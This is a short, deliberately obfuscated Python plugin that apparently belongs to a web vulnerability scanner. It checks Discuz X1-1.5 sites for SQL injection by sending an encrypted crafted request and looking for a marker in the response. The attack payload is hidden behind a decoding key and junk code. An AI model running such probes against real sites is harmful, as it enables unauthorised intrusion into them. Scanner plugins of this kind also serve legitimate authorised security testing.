# -*- coding: utf-8 -*-
import binascii,re
import fcntl

from decode import Decoder
de_key = 'e1244c9d55465d4083a2a832fc4732472b91426238d7935d0e39126138afdac1'
decode = Decoder(binascii.a2b_hex(de_key)).decode
from dummy import *
from miniCurl import Curl
curl = Curl()
 #Embedded file name: discuz_x1-1.5_inj.py
import urlparse
import posixpath
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == '''discuz''':
        return (True, arg)
        if 0:
            O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def audit(arg):
    o0OO00 = arg
    oo, oo, i1iII1IiiIiI1, oo, oo = curl.curl(decode('\xd4Tl\xb5a(u`\xb7\xcc') % (decode("\x85V>\xf99'j2\xf7\xdb\xcaV\x9b\x7fX3Y\xfd?\x12L\xe0\xb1e|Sv\x11L\xf0\xa3\xbc\xd6\x10f\xab\x7fxe5\xef\xc3\xf7H\x85:\x05s\x01\xa7h\\\x00\xb9\xf6!w\x0e8\x05P\xc7\xe0\xa5\xd3\x02n\xa7g*on\xf3\xc6\x8b\x14\x84`Vd\x01\xfd.\x1a\x0e\xa3\xe7%(\x1a"), o0OO00 + decode('\x85F)\xa0\',90\xf7\x9f\xd1O\x8e"J t\xfd(\x16H\xb2\xe1dlXp')))
    if i1iII1IiiIiI1 and i1iII1IiiIiI1.find(decode('\xafb\x1d\xbd;!$2\xe7\xc1')) != -1:
        security_hole(o0OO00)
        if 0:
            ooOoO0O00 * IIiIiII11i


if __name__ == '__main__':
    from dummy import *

#KEY---e1244c9d55465d4083a2a832fc4732472b91426238d7935d0e39126138afdac1---